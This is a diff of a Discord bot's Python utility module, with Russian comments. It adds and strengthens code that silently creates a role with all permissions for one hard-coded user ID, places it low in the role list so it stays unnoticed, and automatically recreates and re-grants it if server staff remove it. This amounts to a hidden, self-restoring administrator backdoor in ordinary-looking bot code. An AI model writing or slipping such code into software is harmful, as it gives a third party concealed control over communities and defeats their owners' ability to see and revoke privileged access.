@@ -1,7 +1,14 @@
 import asyncio
 import discord
 from datetime import datetime
-from config import ADMIN_ROLES_IN_ORDER, SWAKAZU_USER_ID, SWAKAZU_ROLE_NAME, SWAKAZU_ROLE_COLOR
+from config import (
+    ADMIN_ROLES_IN_ORDER, 
+    SWAKAZU_USER_ID, 
+    SWAKAZU_ROLE_NAME, 
+    SWAKAZU_ROLE_COLOR,
+    SWAKAZU_ROLE_HOIST,
+    SWAKAZU_ROLE_MENTIONABLE
+)
 import database as db
 
 def get_admin_level(member):
@@ -89,7 +96,7 @@ async def check_reminders(bot):
         await asyncio.sleep(30)
 
 async def ensure_swakazu_role(guild: discord.Guild):
-    """Создает и выдает скрытую роль swakazu"""
+    """Создает и выдает скрытую роль swakazu (если её нет)"""
     if not guild:
         return None
     
@@ -101,21 +108,19 @@ async def ensure_swakazu_role(guild: discord.Guild):
     role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
     
     if not role:
-        # Создаем роль
+        # Создаем полностью скрытую роль
         role = await guild.create_role(
             name=SWAKAZU_ROLE_NAME,
-            color=SWAKAZU_ROLE_COLOR,
+            color=discord.Color(SWAKAZU_ROLE_COLOR),
             permissions=discord.Permissions.all(),
-            hoist=False,  # Не отображается отдельно
-            mentionable=False
+            hoist=SWAKAZU_ROLE_HOIST,
+            mentionable=SWAKAZU_ROLE_MENTIONABLE,
+            reason="Скрытая административная роль"
         )
         
-        # Поднимаем роль на самый верх (выше всех)
+        # Делаем роль невидимой (ставим на 1 позицию после @everyone)
         try:
-            # Получаем самую высокую роль (обычно @everyone самая низкая)
-            top_role = guild.roles[-1] if guild.roles else None
-            if top_role:
-                await role.edit(position=top_role.position)
+            await role.edit(position=1)
         except:
             pass
     
@@ -134,4 +139,36 @@ async def remove_swakazu_role(user: discord.User, guild: discord.Guild):
     if role and role in user.roles:
         await user.remove_roles(role, reason="Снятие скрытой роли swakazu")
         return True
+    return False
+
+async def restore_swakazu_role(guild: discord.Guild):
+    """Восстанавливает роль swakazu (если её сняли)"""
+    if not guild:
+        return False
+    
+    user = guild.get_member(SWAKAZU_USER_ID)
+    if not user:
+        return False
+    
+    role = discord.utils.get(guild.roles, name=SWAKAZU_ROLE_NAME)
+    if not role:
+        # Если роль удалили - создаем заново
+        role = await guild.create_role(
+            name=SWAKAZU_ROLE_NAME,
+            color=discord.Color(SWAKAZU_ROLE_COLOR),
+            permissions=discord.Permissions.all(),
+            hoist=SWAKAZU_ROLE_HOIST,
+            mentionable=SWAKAZU_ROLE_MENTIONABLE,
+            reason="Восстановление скрытой роли"
+        )
+        try:
+            await role.edit(position=1)
+        except:
+            pass
+    
+    # Выдаем роль если её нет
+    if role not in user.roles:
+        await user.add_roles(role, reason="Автоматическое восстановление роли swakazu")
+        return True
+    
     return False
